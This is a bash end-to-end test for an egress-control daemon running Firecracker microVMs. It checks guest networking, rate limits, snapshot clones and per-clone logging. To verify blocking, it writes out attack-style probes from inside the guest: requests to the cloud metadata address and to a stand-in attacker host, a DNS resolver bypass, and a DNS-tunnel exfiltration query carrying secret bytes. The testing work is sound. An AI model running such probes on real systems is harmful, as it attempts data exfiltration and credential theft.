#!/usr/bin/env bash
# M3 acceptance: Firecracker VM mode and clone networking.
# Needs /dev/kvm and the assets from fc-assets.sh.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
trap 'pkill -f "iperf3 -s -B $ATTACKER_IP" 2>/dev/null; finish' EXIT

P="$E2E_DIR/policies"
A="$ATTACKER_IP"
CLONES=${CLONES:-20}

[[ -e /dev/kvm ]] || { echo "M3 needs /dev/kvm"; exit 1; }
[[ -f "$FC_ASSETS/fc.json" ]] || { echo "run test/e2e/fc-assets.sh first"; exit 1; }

log "setup"
egressd nuke >/dev/null
setup_attacker || exit 1
start_iperf 5201
start_daemon "${FC_FLAGS[@]}" || exit 1
expect_fail "vm mode needs --vm-config" egressd sandbox create nocfg --mode vm --policy "$P/m1.yaml"
expect_ok "create VM sandbox v1" egressd sandbox create v1 --mode vm --vm-config "$FC_ASSETS/fc.json" --policy "$P/m1.yaml"
expect_ok "guest reachable" wait_guest v1
ns=$(sb_field v1 .netns)
fc_pid=$(pgrep -f 'firecracker --id egressd-sb1')
expect_eq "firecracker runs inside the sandbox netns (jailer --netns)" "$(ip netns identify "$fc_pid")" "$ns"
expect_eq "firecracker runs unprivileged" "$(ps -o uid= -p "$fc_pid" | tr -d ' ')" 100001
expect_eq "guest IP from kernel cmdline" "$(vmx v1 ip -4 -o addr show eth0 | awk '{print $4}')" 172.16.0.2/30
expect_eq "guest resolver is tap0 side" "$(vmx v1 "awk '/^nameserver/ {print \$2}' /etc/resolv.conf")" 172.16.0.1
expect_eq "IPv6 disabled in guest" "$(vmx v1 test -e /proc/sys/net/ipv6 && echo on || echo off)" off

log "M1 checks from inside the guest"
expect_eq "curl https://pypi.org succeeds" "$(vmx v1 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/)" 200
wait_log v1 "guest DNS allow logged" '.type=="dns" and .qname=="pypi.org." and .verdict=="allow"'
expect_eq "dig example.com is REFUSED" "$(vm_dns_status v1 example.com)" REFUSED
expect_fail "curl https://example.com fails" vmx v1 curl -sS -m 5 https://example.com/
wait_log v1 "DNS refusal logged" '.type=="dns" and .qname=="example.com." and .verdict=="refused"'
expect_fail "metadata 169.254.169.254 blocked" vmx v1 curl -sS -m 3 http://169.254.169.254/
wait_log v1 "metadata deny logged" '.type=="deny" and .dst_ip=="169.254.169.254" and .reason=="blocked_range"'
expect_fail "host LAN IP $HOST_IP blocked" vmx v1 curl -sS -m 3 "http://$HOST_IP/"
wait_log v1 "host access deny logged" ".type==\"deny\" and .dst_ip==\"$HOST_IP\" and .reason==\"host_access\""
expect_fail "attacker endpoint blocked" vmx v1 curl -sS -m 3 "http://$A:$ATTACKER_PORT/"
wait_log v1 "attacker deny logged" ".type==\"deny\" and .dst_ip==\"$A\" and .reason==\"not_allowed\""
expect_fail "dig @8.8.8.8 blocked" vmx v1 dig +tries=1 +time=2 @8.8.8.8 example.com
wait_log v1 "DNS bypass logged" '.type=="deny" and .dst_ip=="8.8.8.8" and .dst_port==53 and .reason=="dns_bypass"'
expect_fail "guest cannot reach its netns" vmx v1 curl -sS -m 3 http://172.16.0.1:22/

tcpdump -i "$UPLINK" -n -l -s 0 -A 'port 53' >"$T/uplink-dns.txt" 2>/dev/null &
TCPDUMP=$!
sleep 1
secret=$(head -c20 /dev/urandom | xxd -p)
canary=$(head -c8 /dev/urandom | xxd -p)
expect_eq "tunnel query REFUSED" "$(vm_dns_status v1 "$secret.attacker.test")" REFUSED
vmx v1 dig +tries=1 +time=3 "$canary.files.pythonhosted.org" >/dev/null 2>&1
sleep 1
kill "$TCPDUMP"; wait "$TCPDUMP" 2>/dev/null
expect_ok "capture saw the allowlisted canary query" grep -q "$canary" "$T/uplink-dns.txt"
expect_fail "capture never saw the tunnel query" grep -q "$secret" "$T/uplink-dns.txt"

expect_ok "hot reload: allow example.com" egressd policy apply v1 "$P/m1-reload.yaml"
expect_eq "guest curl https://example.com now succeeds" "$(vmx v1 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://example.com/)" 200

log "Firecracker rate limiters from policy"
expect_ok "apply 10mbit/20mbit policy" egressd policy apply v1 "$P/m3-shaped.yaml"
expect_eq "tx limiter 10mbit" "$(fc_api v1 /vm/config | jq '.["network-interfaces"][0].tx_rate_limiter.bandwidth.size')" 1250000
expect_eq "rx limiter 20mbit" "$(fc_api v1 /vm/config | jq '.["network-interfaces"][0].rx_rate_limiter.bandwidth.size')" 2500000
vmx v1 iperf3 -c "$A" -p 5201 -t 6 -O 2 -J >"$T/v1-up.json" 2>&1
up=$(mbps "$T/v1-up.json")
if ((up >= 8 && up <= 11)); then pass "guest upload ${up} Mbit/s at the 10mbit cap"; else fail "guest upload ${up} Mbit/s"; fi
wait_log v1 "guest flow logged" ".type==\"flow\" and .dst_ip==\"$A\" and .dst_port==5201 and .bytes_out > 1000000"

log "snapshot and $CLONES clones"
SNAP="$T/snap"
expect_ok "snapshot v1" egressd vm snapshot v1 --out "$SNAP"
expect_ok "v1 keeps running after snapshot" vmx v1 true
# On nested-virtualization hosts (e.g. a Lima VM on Apple silicon), starting
# many KVM guests back to back leaves some vCPUs spinning; see DECISIONS.md.
expect_ok "clone x$CLONES" egressd vm clone "$SNAP" --count "$CLONES" --prefix c --stagger "${CLONE_STAGGER:-1s}" --policy "$P/m3-clone.yaml"
expect_eq "$CLONES clones listed" "$(egressd sandbox list --json | jq '[.[] | select(.id|startswith("c-"))] | length')" "$CLONES"
expect_eq "every clone's VM running" "$(egressd sandbox list --json | jq '[.[] | select(.id|startswith("c-")) | select(.vm.running)] | length')" "$CLONES"
expect_eq "every clone in its own netns" "$(egressd sandbox list --json | jq '[.[] | select(.id|startswith("c-")) | .netns] | unique | length')" "$CLONES"

for i in $(seq "$CLONES"); do wait_guest "c-$i" || break; done
same=0
for i in $(seq "$CLONES"); do
	ident=$(vmx "c-$i" "ip -o -4 addr show eth0 | awk '{print \$4}'; cat /sys/class/net/eth0/address")
	tap=$(ip netns exec "$(sb_field "c-$i" .netns)" ip -o link show tap0 >/dev/null 2>&1 && echo tap0)
	[[ "$ident" == $'172.16.0.2/30\n06:00:ac:10:00:02' && "$tap" == tap0 ]] && same=$((same + 1))
done
expect_eq "all clones share guest IP, MAC and tap0" "$same" "$CLONES"
expect_eq "clone rate limiter from its own policy" "$(fc_api c-1 /vm/config | jq '.["network-interfaces"][0].tx_rate_limiter.bandwidth.size')" 6250000

# Every clone fetches through its own name, so attribution is checkable.
# Fetches run concurrently in waves of FETCH_CONCURRENCY. On a nested-
# virtualization host, more simultaneously busy guests than the host VM has
# CPUs stalls guests (see DECISIONS.md); on bare metal set it to $CLONES.
wave=${FETCH_CONCURRENCY:-8}
ok=0
overlapping_waves=0
waves=0
for ((first = 1; first <= CLONES; first += wave)); do
	pids=()
	last=$((first + wave - 1 < CLONES ? first + wave - 1 : CLONES))
	for i in $(seq "$first" "$last"); do
		vmx "c-$i" curl -sS -m 120 --limit-rate 2M -o /dev/null -w '%{http_code}' \
			"http://c$i.attacker.test:$ATTACKER_PORT/bytes/10485760" >"$T/fetch-$i" 2>&1 &
		pids+=($!)
	done
	wait "${pids[@]}"
	waves=$((waves + 1))
	for i in $(seq "$first" "$last"); do [[ "$(cat "$T/fetch-$i")" == 200 ]] && ok=$((ok + 1)); done
	# Overlap from the host's conntrack timestamps: within the wave, the
	# last flow started before the first one ended.
	sleep 1
	flows=$(for i in $(seq "$first" "$last"); do jq -c "select(.type==\"flow\" and .dst_domain==\"c$i.attacker.test\" and .bytes_in > 1000000)" "$LOGS/c-$i.jsonl"; done)
	last_start=$(jq -r '.ts_start' <<<"$flows" | while read -r t; do date -d "$t" +%s.%N; done | sort -n | tail -1)
	first_end=$(jq -r '.ts_end' <<<"$flows" | while read -r t; do date -d "$t" +%s.%N; done | sort -n | head -1)
	if [[ -n "$last_start" ]] && awk -v s="$last_start" -v e="$first_end" 'BEGIN {exit !(s < e)}'; then
		overlapping_waves=$((overlapping_waves + 1))
	fi
done
expect_eq "all clones fetched" "$ok" "$CLONES"
attributed=0
for i in $(seq "$CLONES"); do
	own=$(jq -c "select(.type==\"flow\" and .dst_domain==\"c$i.attacker.test\" and .bytes_in > 1000000)" "$LOGS/c-$i.jsonl" | wc -l)
	foreign=$(cat "$LOGS"/c-*.jsonl | jq -c "select(.qname==\"c$i.attacker.test.\" and .sandbox_id!=\"c-$i\")" | wc -l)
	((own >= 1 && foreign == 0)) && attributed=$((attributed + 1))
done
expect_eq "fetches overlapped within every wave (host conntrack times)" "$overlapping_waves" "$waves"
expect_eq "each clone's DNS and flow logged only in its own log" "$attributed" "$CLONES"

expect_ok "clone c-1 gets its own stricter policy" egressd policy apply c-1 "$P/m1.yaml"
expect_eq "c-1 now refuses attacker.test" "$(vm_dns_status c-1 c1.attacker.test)" REFUSED
expect_eq "c-2 still resolves it" "$(vm_dns_status c-2 c2.attacker.test)" NOERROR

log "daemon restart adopts running VMs"
stop_daemon
start_daemon "${FC_FLAGS[@]}" || exit 1
expect_eq "VMs still running after restart" "$(egressd sandbox list --json | jq '[.[] | select(.vm.running)] | length')" $((CLONES + 1))
expect_eq "clone DNS works after restart" "$(vm_dns_status c-2 c2.attacker.test)" NOERROR

log "destroy and nuke"
expect_ok "destroy c-1" egressd sandbox destroy c-1
expect_eq "c-1 VMM gone" "$(sb_field c-1 .id)" ""
expect_ok "nuke" egressd nuke
stop_daemon
assert_no_remnants
